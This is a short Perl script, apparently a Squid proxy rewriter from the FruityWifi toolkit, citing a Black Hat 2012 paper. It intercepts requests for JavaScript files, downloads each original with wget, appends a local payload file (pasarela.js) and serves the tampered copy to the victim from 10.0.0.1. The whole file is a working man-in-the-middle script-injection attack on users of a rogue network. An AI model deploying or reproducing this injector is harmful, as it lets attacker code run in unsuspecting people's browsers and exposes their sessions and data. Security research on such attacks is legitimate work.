#!/usr/bin/perl

# REF: http://media.blackhat.com/bh-us-12/Briefings/Alonso/BH_US_12_Alonso_Owning_Bad_Guys_WP.pdf

$|=1;
$count = 0;
$pid = $$;

while (<>)
{
	chomp $_;
	if ($_ =~ /(.*\.js)/i)
	{
	
		$url = $1;
		system("/usr/bin/wget", "-q", "-O", "/var/www/tmp/$pid-$count.js", "$url");
		system("chmod o+r /var/www/tmp/$pid-$count.js");
		system("cat /usr/share/FruityWifi/squid.inject/pasarela.js >> /var/www/tmp/$pid-$count.js");
		print "http://10.0.0.1:80/tmp/$pid-$count.js\n";
	}
	else
	{
		print "$_\n";
	}
	$count++;
}